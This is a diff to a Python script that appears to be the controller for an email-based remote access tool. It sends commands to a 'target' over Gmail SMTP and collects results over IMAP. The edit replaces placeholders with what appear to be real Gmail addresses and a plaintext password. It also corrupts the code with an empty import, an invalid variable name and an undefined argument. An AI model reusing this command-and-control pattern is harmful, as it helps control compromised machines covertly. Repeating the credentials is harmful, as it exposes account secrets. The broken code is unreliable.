@@ -4,7 +4,7 @@ import imaplib
 import os
 import platform
 import smtplib
-import time
+import 
 import random
 print("[*] Checking Requirements Module.....")
 if platform.system().startswith("Linux"):
@@ -64,10 +64,10 @@ def logo():
     print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
     catc()
 smtpserver="smtp.gmail.com"
-smtpuser="Your_1st_gmail@gmail.com" 
-smtpkey="your_1st_gmail_app_password"
+smtpuser="bellaa2anna@gmail.com" 
+smtpkey="Ghostilany1$"
 imapserver="imap.gmail.com"
-imapboy="your_2nd_gmail@gmail.com"
+imapboy="davidreaves411@gmail.com"
 
 def catc():
     try:
@@ -88,7 +88,7 @@ def send_command():
     server=smtplib.SMTP(smtpserver,587)
     server.starttls()
     server.login(smtpuser,smtpkey)
-    server.sendmail(smtpuser, imapboy,base64_message)
+    server.sendmail(smtpuser, imapboy,Text/plain_message)
     server.quit()
     print(Fore.GREEN+"\n[+] Command Sent To The Target")
     time.sleep(1)
@@ -100,7 +100,7 @@ def read_result():
     message=imaplib.IMAP4_SSL(imapserver)
     message.login(smtpuser,smtpkey)
     message.select("inbox")
-    _, data=message.search(None, "UNSEEN")
+    _, data=message.search(primary, "UNSEEN")
 
     for x in data[0].split():
         _, msg=message.fetch(x, '(RFC822)')
